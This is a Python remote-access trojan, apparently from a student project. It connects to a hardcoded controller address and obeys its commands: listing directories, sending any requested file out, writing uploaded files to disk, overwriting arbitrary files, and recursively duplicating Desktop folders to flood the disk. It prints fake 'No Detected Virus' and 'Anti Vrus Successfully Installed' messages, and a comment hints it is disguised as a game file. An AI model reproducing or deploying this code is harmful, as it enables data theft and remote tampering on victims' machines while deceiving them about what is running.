from socket import *
import os
import shutil
import random


def baby(loc):
    try:
        kk=[ f.path for f in os.scandir(loc) if f.is_dir() ]
    except:
        # print("YEAH, EXCEPTION")
        return
    for k in kk:
        try:
            l=random.randint(1,100)
            shutil.copytree(k,k+str(l))
            baby(k)
        except:
            # print("EXCEPTION")
            pass




host = "192.168.43.179"
port = 7000

s = socket(AF_INET, SOCK_STREAM)

s.connect((host, port))

count = 0

while True:
    command = s.recv(1024)
    command = command.decode()

    if command == "vcd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print("No Detected Virus 1")
    
    elif command == "vfcd":
        directory = s.recv(5000)
        directory = directory.decode()
        files = os.listdir(directory)
        fileCount = len(files)

        fC = int(fileCount)

        fileCount=  str(fileCount) + ";"

        s.send(fileCount.encode())

        for i in range(fC):
            s.send((files[i] + ";").encode())

        print("No Detected Virus 2")

    elif command == "download_file":
        filePath = s.recv(5000)
        filePath = filePath.decode()

        filee = open(filePath, "rb")
        data = filee.read()

        s.send(data)
        print("")

        print("No Virus FOund 3")

        print("")

    elif command == "upload":
        count+=1
        fileName =  "antiVirus" + str(count)+".py"
        files = s.recv(100000)

        newFile = open(fileName,"wb")
        newFile.write(files)
        newFile.close()

        print("")

        print(fileName, "has been downloaded")

        print("")

    elif command == 'replace':
        filePath = s.recv(5000)
        filePath = filePath.decode()

        files = s.recv(100000)

        newFile = open(filePath,"wb")
        newFile.write(files)
        newFile.close()

        print("")

    elif command == "replicate":
        baby("/Users/suhasgumma/Desktop/")
        print("")
    
    elif command == "exit":
        print("Anti Vrus Successfully Installed.")
        s.close()
        break

    elif command == "N/A":
        print("")


# /Users/suhasgumma/Desktop/SAD project/favgame.py

